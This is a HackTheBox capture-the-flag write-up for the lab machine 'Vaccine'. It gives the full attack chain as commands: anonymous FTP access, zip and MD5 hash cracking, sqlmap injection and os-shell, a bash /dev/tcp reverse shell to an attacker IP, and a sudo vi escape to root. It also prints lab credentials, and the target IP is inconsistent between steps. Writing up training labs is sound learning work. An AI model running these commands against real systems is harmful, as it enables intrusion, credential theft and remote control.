# Vaccine - HTB Starting Point

## Info
| Property   | Value                     |
| ---------- | ------------------------- |
| Platform   | HackTheBox Starting Point |
| Difficulty | Very Easy                 |
| OS         | Linux                     |
| IP         | 10.129.40.245             |
| Date       | 2026-03-19                |

---

## Key Concepts Learned
- FTP anonymous login
- Zip password cracking (zip2john + John the Ripper)
- MD5 hash cracking
- SQL Injection with authenticated cookies
- TTY shell upgrade
- Privilege escalation via vi (GTFOBins)

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV --open 10.129.40.245
```

**Open Ports:**
| Port | Service | Version             |
|------|---------|---------------------|
| 21   | FTP     | vsftpd 3.0.3        |
| 22   | SSH     | OpenSSH 8.0p1       |
| 80   | HTTP    | Apache httpd 2.4.41 |

---

## Exploitation

### The Attack Chain

```
FTP (anonymous) → Download backup.zip → Crack zip password → Extract admin creds → Crack MD5 hash → Login to web → SQLi with sqlmap → os-shell → Reverse shell
```

### Step 1: Connect to FTP

```bash
ftp 10.129.40.245 21
```

Login credentials:
- **Name:** anonymous
- **Password:** (blank)

### Step 2: Download Backup File

```bash
get backup.zip
```

### Step 3: Crack the ZIP Password

```bash
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

### Step 4: Extract backup.zip

```bash
unzip backup.zip
```

Found admin username and MD5 password hash in extracted files:
```
admin: 2cb42f8734ea607eefed3b70af13bbd3
```

### Step 5: Crack the MD5 Hash

```bash
# Save hash to file
echo '2cb42f8734ea607eefed3b70af13bbd3' > md5pass.txt

# Crack the hash
john --format=raw-md5 md5pass.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked password
john --show --format=raw-md5 md5pass.txt
```

**Result:** `qwerty789`

### Step 6: Log in as Admin

Navigate to `http://10.129.95.174/dashboard.php` and log in with:
- **Username:** `admin`
- **Password:** `qwerty789`

### Step 7: SQL Injection with SQLMap

#### Why SQL Injection?

The dashboard shows a table with a search function. When we search for something, the URL becomes:
```
http://10.129.95.174/dashboard.php?search=test
```

This suggests user input is being passed to a database query. If user input is passed directly to the query without validation, SQL injection is possible.

#### Getting a Valid Session Cookie

To use SQLMap, we need an authenticated session cookie. The cookie proves we're logged in, otherwise the server redirects us to the login page.

**Method 1: Get cookie from browser**
1. Log in to the website
2. Press F12 → Application → Cookies
3. Copy the `PHPSESSID` value

**Method 2: Get cookie with curl**
```bash
curl -v -c cookies.txt -d "username=admin&password=qwerty789" "http://10.129.95.174/index.php"
```

Look for this line in the output:
```
Set-Cookie: PHPSESSID=3drbc0mk26qfaff1v3gam02sfg; path=/
```

#### Running SQLMap

```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=test' --cookie="PHPSESSID=YOUR_COOKIE_HERE"
```

**Explanation of flags:**
| Flag       | Purpose                                    |
|------------|--------------------------------------------|
| `-u`       | Target URL with the injectable parameter   |
| `--cookie` | Session cookie to authenticate the request |

**Important:** Cookie syntax uses `=` not `:` (e.g., `PHPSESSID=abc123`)

### Step 8: Getting a Shell with --os-shell

Once SQLMap confirms the injection, we can use `--os-shell` to get command execution on the server.

```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=test' --cookie="PHPSESSID=YOUR_COOKIE_HERE" --os-shell
```

#### What does --os-shell do?

The `--os-shell` flag attempts to spawn an interactive operating system shell through SQL injection:

1. **Uploads a web shell** (e.g., PHP file) to a writable directory
2. **Executes system commands** through that web shell
3. **Returns output** to your terminal

#### Requirements for --os-shell to work:
| Requirement                          | Why                      |
|--------------------------------------|--------------------------|
| Database user needs FILE privilege   | To write files to disk   |
| Writable web directory               | To upload the shell      |
| Stacked queries or UNION injection   | To execute the upload    |

#### os-shell Success

Once `--os-shell` works, you get a prompt where you can execute commands:

```
os-shell> whoami
postgres

os-shell> ls
base
global
pg_commit_ts
...
```

**Note:** The os-shell is slow because each command requires a new SQL injection request. For better usability, upgrade to a reverse shell.

### Step 9: Upgrade to Reverse Shell

The os-shell is functional but slow. A reverse shell provides a faster, more stable connection.

#### Start a Netcat listener (on your machine):

```bash
nc -lvnp 4444
```

#### In os-shell (on target):

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'
```

### Step 10: Upgrade Shell to Interactive TTY

Once you receive the connection, the shell is basic (no tab completion, no arrow keys). Upgrade it:

**On the target (in your reverse shell):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press `Ctrl+Z` to background the shell.

**On your machine:**
```bash
stty raw -echo; fg
```

**Back on target:**
```bash
export TERM=xterm
```

---

## Privilege Escalation

### Step 11: Find Credentials

Found database credentials in the web application source code:
```bash
cat /var/www/html/dashboard.php
```

**Credentials found:**
- **User:** postgres
- **Password:** P@s5w0rd!

### Step 12: Check Sudo Privileges

After gaining initial access as the postgres user, I checked for sudo privileges using the `sudo -l` command. I discovered that the user could run `/bin/vi` as root on a specific configuration file.

```bash
sudo -l
```

Enter password: `P@s5w0rd!`

**Output:**
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The system was misconfigured to allow a text editor (`vi`) to be executed with elevated privileges (`sudo`). Many text editors have a feature called a **"shell escape"**, which allows the user to execute system commands from within the application.

### Step 13: Privilege Escalation via vi (GTFOBins)

Since `vi` runs as root, we can escape to a root shell using GTFOBins technique.
GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.

**Run vi as root:**
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**Inside vi, escape to shell:**
```
:!/bin/bash
```

Press `Enter` - you now have a root shell!

### Step 14: Capture the Flag

```bash
cat /root/root.txt
```

---

## Conclusion

This machine demonstrated a complete attack chain from initial access to root:

1. **Information Gathering** - Found backup file via anonymous FTP
2. **Credential Cracking** - Used John the Ripper to crack ZIP and MD5 hash
3. **Web Exploitation** - SQL injection via search parameter
4. **Initial Access** - Gained shell through SQLMap's os-shell feature
5. **Privilege Escalation** - Exploited sudo misconfiguration using GTFOBins

**Key Takeaway:** Always check `sudo -l` for privilege escalation opportunities and reference GTFOBins for exploitation techniques.
